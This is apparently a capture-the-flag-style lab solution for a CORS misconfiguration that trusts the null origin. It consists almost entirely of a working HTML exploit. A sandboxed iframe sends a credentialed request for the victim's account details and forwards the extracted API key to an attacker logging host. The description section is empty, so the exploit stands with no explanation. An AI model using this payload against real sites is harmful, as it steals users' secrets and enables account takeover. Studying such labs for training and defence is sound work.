# Lab: CORS vulnerability with trusted null origin
## Description
.

## Solution
```html
<html>
<head>
</head>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://target.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var obj = JSON.parse(this.responseText);
location='https://hacker.web-security-academy.net/log?key='+obj.apikey;
};
</script>"></iframe>
</body>
</html>
```